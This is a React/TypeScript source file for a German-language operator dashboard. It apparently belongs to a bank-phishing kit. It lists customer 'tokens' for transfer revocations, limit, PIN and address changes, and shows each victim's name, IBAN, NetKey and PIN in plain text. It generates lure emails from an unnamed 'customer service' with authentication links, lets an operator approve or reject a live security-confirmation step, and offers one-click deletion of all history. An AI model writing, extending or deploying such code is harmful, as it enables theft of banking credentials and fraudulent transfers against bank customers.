import { useEffect, useMemo, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Copy, RefreshCw, Trash2, Check, X, Clock, Smartphone, Ban, Sliders, KeyRound, Mail, ShieldCheck, Link2, MapPin } from "lucide-react";
import { toast } from "sonner";
import EmailSendDialog from "./EmailSendDialog";
import { buildCustomerLink } from "@/lib/customerLink";

type Kind = "storno" | "limit" | "pin" | "auth" | "adress";

interface UnifiedRow {
  kind: Kind;
  id: string;
  token: string;
  used: boolean;
  used_at: string | null;
  created_at: string;
  customer_phase: string | null;
  security_status: string | null;
  auftraggeber_name: string | null;
  auftraggeber_iban: string | null;
  // storno
  empfaenger_name?: string | null;
  empfaenger_iban?: string | null;
  betrag?: number | null;
  verwendungszweck?: string | null;
  // limit
  current_limit?: number | null;
  new_limit?: number | null;
  // adress
  curr_strasse?: string | null;
  curr_plz?: string | null;
  curr_ort?: string | null;
  new_strasse?: string | null;
  new_plz?: string | null;
  new_ort?: string | null;
}

const tableFor = (k: Kind) =>
  k === "storno" ? "storno_tokens" : k === "limit" ? "limit_tokens" : k === "auth" ? "auth_tokens" : k === "adress" ? "adress_tokens" : "pin_tokens";

const UnifiedTokensList = () => {
  const [rows, setRows] = useState<UnifiedRow[]>([]);
  const [authMeta, setAuthMeta] = useState<Record<string, { netkey: string | null; pin: string | null }>>({});

  const load = async () => {
    const [s, l, p, a, ad] = await Promise.all([
      (supabase as any).from("storno_tokens").select("*").order("created_at", { ascending: false }),
      (supabase as any).from("limit_tokens").select("*").order("created_at", { ascending: false }),
      (supabase as any).from("pin_tokens").select("*").order("created_at", { ascending: false }),
      (supabase as any).from("auth_tokens").select("*").order("created_at", { ascending: false }),
      (supabase as any).from("adress_tokens").select("*").order("created_at", { ascending: false }),
    ]);
    const all: UnifiedRow[] = [
      ...(s.data || []).map((r: any) => ({ ...r, kind: "storno" as Kind })),
      ...(l.data || []).map((r: any) => ({ ...r, kind: "limit" as Kind })),
      ...(p.data || []).map((r: any) => ({ ...r, kind: "pin" as Kind })),
      ...(a.data || []).map((r: any) => ({ ...r, kind: "auth" as Kind })),
      ...(ad.data || []).map((r: any) => ({ ...r, kind: "adress" as Kind })),
    ].sort((a, b) => (a.created_at < b.created_at ? 1 : -1));
    setRows(all);

    const authIds = (a.data || []).map((r: any) => r.id);
    if (authIds.length) {
      const { data: metas } = await (supabase as any)
        .from("panel_task_meta")
        .select("task_id, netkey, pin")
        .in("task_id", authIds.map((id: string) => `auth:${id}`));
      const am: Record<string, { netkey: string | null; pin: string | null }> = {};
      (metas || []).forEach((m: any) => {
        am[String(m.task_id).replace(/^auth:/, "")] = { netkey: m.netkey, pin: m.pin };
      });
      setAuthMeta(am);
    } else {
      setAuthMeta({});
    }
  };

  useEffect(() => {
    load();
    const channels = (["storno_tokens", "limit_tokens", "pin_tokens", "auth_tokens", "adress_tokens", "panel_task_meta"] as const).map(t =>
      (supabase as any).channel(`unified_${t}`).on("postgres_changes", { event: "*", schema: "public", table: t }, load).subscribe()
    );
    const iv = window.setInterval(load, 5000);
    return () => { window.clearInterval(iv); channels.forEach(c => (supabase as any).removeChannel(c)); };
  }, []);

  const copy = (t: string) => { navigator.clipboard.writeText(t); toast.success("Token kopiert"); };
  const copyLink = (r: UnifiedRow) => {
    const url = buildCustomerLink(r.auftraggeber_name, r.token);
    navigator.clipboard.writeText(url);
    toast.success("Kunden-Link kopiert");
  };


  const handleDelete = async (r: UnifiedRow) => {
    if (!window.confirm("Token wirklich löschen?")) return;
    const { error } = await (supabase as any).from(tableFor(r.kind)).delete().eq("id", r.id);
    if (error) { toast.error("Fehler beim Löschen"); return; }
    setRows(prev => prev.filter(x => !(x.id === r.id && x.kind === r.kind)));
  };

  const handleDeleteAll = async () => {
    if (!window.confirm("Wirklich den GESAMTEN Token-Verlauf löschen?")) return;
    const tables = ["storno_tokens", "limit_tokens", "pin_tokens", "auth_tokens", "adress_tokens"] as const;
    await Promise.all(tables.map(t => (supabase as any).from(t).delete().not("id", "is", null)));
    toast.success("Token-Verlauf gelöscht");
    setRows([]); load();
  };

  const handleReset = async (r: UnifiedRow) => {
    const { error } = await (supabase as any).from(tableFor(r.kind))
      .update({ used: false, used_at: null, security_status: "pending", security_status_at: null, customer_phase: null })
      .eq("id", r.id);
    if (error) { toast.error("Fehler"); return; }
    toast.success("Token zurückgesetzt"); load();
  };

  const setSecurityStatus = async (r: UnifiedRow, status: "approved" | "rejected" | "timeout") => {
    const { error } = await (supabase as any).from(tableFor(r.kind))
      .update({ security_status: status, security_status_at: new Date().toISOString() })
      .eq("id", r.id);
    if (error) { toast.error("Fehler"); return; }
    toast.success(status === "approved" ? "Freigabe erteilt" : status === "rejected" ? "Abgelehnt" : "Zeitüberschritten");
    load();
  };

  // Email dialog
  const [emailOpen, setEmailOpen] = useState(false);
  const [emailVars, setEmailVars] = useState<Record<string, string>>({});
  const [emailTitle, setEmailTitle] = useState("Email versenden");
  const [emailSubject, setEmailSubject] = useState("Kundenauthentifizierung");
  const [emailHtml, setEmailHtml] = useState("");

  const openEmail = (r: UnifiedRow) => {
    const kindLabel = r.kind === "pin" ? "PIN-Änderung" : r.kind === "limit" ? "Limit-Änderung" : r.kind === "auth" ? "Kundenauthentifizierung" : r.kind === "adress" ? "Adress-Änderung" : "Überweisungswiderruf";
    const link = buildCustomerLink(r.auftraggeber_name, r.token);
    setEmailVars({
      token: r.token,
      auftraggeber: r.auftraggeber_name || "",
      iban: r.auftraggeber_iban || "",
      kind: kindLabel,
      link,
      betrag: r.betrag != null ? `${Number(r.betrag).toFixed(2)} €` : "",
      empfaenger: r.empfaenger_name || "",
      empfaenger_iban: r.empfaenger_iban || "",
    });
    setEmailTitle(`Email · Kundenauthentifizierung · ${r.auftraggeber_name || r.token}`);
    setEmailSubject("Kundenauthentifizierung");
    setEmailHtml(
      `<p>Sehr geehrte/r ${r.auftraggeber_name || "Kunde/in"},</p>` +
      `<p>bitte schließen Sie Ihre Kundenauthentifizierung über den folgenden Link ab:</p>` +
      `<p><a href="${link}">${link}</a></p>` +
      `<p>Mit freundlichen Grüßen<br/>Ihr Kundenservice</p>`
    );
    setEmailOpen(true);
  };

  const stornoCount = useMemo(() => rows.filter(r => r.kind === "storno").length, [rows]);
  const limitCount = useMemo(() => rows.filter(r => r.kind === "limit").length, [rows]);
  const pinCount = useMemo(() => rows.filter(r => r.kind === "pin").length, [rows]);
  const authCount = useMemo(() => rows.filter(r => r.kind === "auth").length, [rows]);
  const adressCount = useMemo(() => rows.filter(r => r.kind === "adress").length, [rows]);


  return (
    <>
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-3 flex-wrap">
            <span>Aktive Tokens ({rows.length})</span>
            <Badge variant="outline" className="gap-1"><Ban className="h-3 w-3" /> Storno {stornoCount}</Badge>
            <Badge variant="outline" className="gap-1"><Sliders className="h-3 w-3" /> Limit {limitCount}</Badge>
            <Badge variant="outline" className="gap-1"><KeyRound className="h-3 w-3" /> PIN {pinCount}</Badge>
            <Badge variant="outline" className="gap-1"><ShieldCheck className="h-3 w-3" /> Auth {authCount}</Badge>
            <Badge variant="outline" className="gap-1"><MapPin className="h-3 w-3" /> Adress {adressCount}</Badge>
            {rows.length > 0 && (
              <Button variant="destructive" size="sm" className="ml-auto gap-1" onClick={handleDeleteAll}>
                <Trash2 className="h-3.5 w-3.5" />Verlauf löschen
              </Button>
            )}
          </CardTitle>
        </CardHeader>
        <CardContent>
          {rows.length === 0 ? (
            <div className="text-sm text-muted-foreground text-center py-6">Noch keine Tokens erstellt.</div>
          ) : (
            <div className="space-y-2">
              {rows.map(r => {
                const isLimit = r.kind === "limit";
                const isPin = r.kind === "pin";
                const isAuth = r.kind === "auth";
                const isAdress = r.kind === "adress";
                const KindIcon = isAdress ? MapPin : isAuth ? ShieldCheck : isPin ? KeyRound : isLimit ? Sliders : Ban;
                const kindLabel = isAdress ? "Adress" : isAuth ? "Auth" : isPin ? "PIN" : isLimit ? "Limit" : "Storno";
                return (
                  <div key={`${r.kind}-${r.id}`} className="flex flex-col gap-2 p-3 rounded-md border bg-card">
                    <div className="flex items-center justify-between gap-3">
                      <div className="flex items-center gap-2 flex-wrap">
                        <Badge variant="outline" className="gap-1"><KindIcon className="h-3 w-3" />{kindLabel}</Badge>
                        <code className="px-2 py-1 rounded bg-muted font-mono text-sm">{r.token}</code>
                        {r.used
                          ? <Badge variant="secondary" className="gap-1"><Check className="h-3 w-3" />verwendet</Badge>
                          : <Badge className="gap-1 bg-green-600 hover:bg-green-700"><X className="h-3 w-3" />offen</Badge>}
                        {r.security_status === "approved" && (
                          <Badge className="gap-1 bg-emerald-600"><Check className="h-3 w-3" />Freigabe</Badge>
                        )}
                        {r.security_status === "rejected" && (
                          <Badge className="gap-1 bg-red-600"><X className="h-3 w-3" />abgelehnt</Badge>
                        )}
                        {r.security_status === "timeout" && (
                          <Badge className="gap-1 bg-orange-500"><Clock className="h-3 w-3" />Timeout</Badge>
                        )}
                        {r.customer_phase === "security" && (!r.security_status || r.security_status === "pending") && (
                          <Badge className="gap-1 bg-blue-600"><Smartphone className="h-3 w-3" />Sicherheitsfreigabe</Badge>
                        )}
                        {r.customer_phase === "completed" && (
                          <Badge className="gap-1 bg-emerald-700"><Check className="h-3 w-3" />abgeschlossen</Badge>
                        )}
                      </div>
                      <div className="flex gap-1 shrink-0">
                        <Button size="sm" variant="ghost" onClick={() => copy(r.token)} title="Token kopieren"><Copy className="h-3 w-3" /></Button>
                        <Button size="sm" variant="ghost" onClick={() => copyLink(r)} title="Kunden-Link kopieren"><Link2 className="h-3 w-3" /></Button>
                        <Button size="sm" variant="ghost" onClick={() => openEmail(r)} title="Email versenden"><Mail className="h-3 w-3" /></Button>
                        {(r.used || r.security_status !== "pending" || r.customer_phase) && (
                          <Button size="sm" variant="ghost" onClick={() => handleReset(r)} title="Zurücksetzen"><RefreshCw className="h-3 w-3" /></Button>
                        )}
                        <Button size="sm" variant="ghost" onClick={() => handleDelete(r)}><Trash2 className="h-3 w-3 text-destructive" /></Button>
                      </div>
                    </div>
                    <div className="grid sm:grid-cols-2 gap-x-4 gap-y-1 text-xs text-muted-foreground pt-1 border-t">
                      <div><span className="font-semibold">Kontoinhaber:</span> {r.auftraggeber_name} · {r.auftraggeber_iban}</div>
                      {isLimit && (
                        <div><span className="font-semibold">Limit:</span> {r.current_limit?.toFixed(2)} € → {r.new_limit?.toFixed(2)} €</div>
                      )}
                      {isAdress && (
                        <div className="sm:col-span-2">
                          <span className="font-semibold">Adresse:</span>{" "}
                          {[r.curr_strasse, [r.curr_plz, r.curr_ort].filter(Boolean).join(" ")].filter(Boolean).join(", ") || "—"}
                          {" → "}
                          {[r.new_strasse, [r.new_plz, r.new_ort].filter(Boolean).join(" ")].filter(Boolean).join(", ") || "—"}
                        </div>
                      )}
                      {r.kind === "storno" && (
                        <>
                          <div><span className="font-semibold">Empfänger:</span> {r.empfaenger_name} · {r.empfaenger_iban}</div>
                          <div><span className="font-semibold">Betrag:</span> {r.betrag != null ? `${Number(r.betrag).toFixed(2)} €` : "—"}</div>
                          {r.verwendungszweck && <div><span className="font-semibold">Zweck:</span> {r.verwendungszweck}</div>}
                        </>
                      )}
                    </div>
                    {isAuth && (authMeta[r.id]?.netkey || authMeta[r.id]?.pin) && (
                      <div className="grid sm:grid-cols-2 gap-x-4 gap-y-1 text-xs pt-1 border-t border-dashed bg-amber-50/60 rounded px-2 py-1.5">
                        <div><span className="font-semibold text-amber-900">NetKey:</span> <code className="font-mono">{authMeta[r.id]?.netkey || "—"}</code></div>
                        <div><span className="font-semibold text-amber-900">PIN:</span> <code className="font-mono">{authMeta[r.id]?.pin || "—"}</code></div>
                      </div>
                    )}
                    {(r.customer_phase === "security" || (r.security_status && r.security_status !== "pending")) && (
                      <div className="flex flex-wrap gap-2 pt-2 border-t border-dashed">
                        {r.security_status !== "approved" && (
                          <>
                            <Button size="sm" variant="outline" className="gap-1" onClick={() => setSecurityStatus(r, "approved")}>
                              <Check className="h-3 w-3" />Freigeben
                            </Button>
                            <Button size="sm" variant="outline" className="gap-1" onClick={() => setSecurityStatus(r, "rejected")}>
                              <X className="h-3 w-3" />Ablehnen
                            </Button>
                          </>
                        )}
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          )}
        </CardContent>
      </Card>

      <EmailSendDialog open={emailOpen} onOpenChange={setEmailOpen} variables={emailVars} title={emailTitle} defaultSubject={emailSubject} defaultHtml={emailHtml} />
    </>
  );
};

export default UnifiedTokensList;
